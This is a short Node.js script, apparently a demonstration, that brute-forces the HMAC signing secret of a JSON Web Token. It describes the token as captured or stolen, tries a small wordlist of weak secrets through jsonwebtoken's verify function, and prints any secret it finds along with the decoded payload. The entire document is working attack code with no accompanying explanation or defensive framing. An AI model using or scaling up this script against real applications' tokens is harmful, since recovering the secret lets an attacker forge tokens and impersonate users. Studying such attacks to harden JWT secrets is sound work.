const jwt = require("jsonwebtoken");

// The token we captured (e.g., sniffed, stolen from localStorage, etc.)
const stolenToken =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InBvbSIsImlhdCI6MTc4ODI0MjgxMSwiZXhwIjoxNzg4MjQzNzExfQ.JxeQzSX7W1-MWMK_cKI9o3RRpkR5GxZDtgjKP62XBbo";// Small wordlist simulating common/weak secrets
const wordlist = [
  "123456",
  "password",
  "secret",
  "secret123",
  "admin",
  "jwtsecret",
  "letmein",
  "qwerty",
  "test",
  "changeme",
];

console.log("Starting brute-force attack...\n");

let cracked = false;
for (const guess of wordlist) {
  try {
    const decoded = jwt.verify(stolenToken, guess);
    console.log(`✅ SECRET FOUND: "${guess}"`);
    console.log("Decoded payload:", decoded);
    cracked = true;
    break;
  } catch (err) {
    console.log(`❌ Tried "${guess}" — failed`);
  }
}

if (!cracked) {
  console.log("\nSecret not found in wordlist.");
}
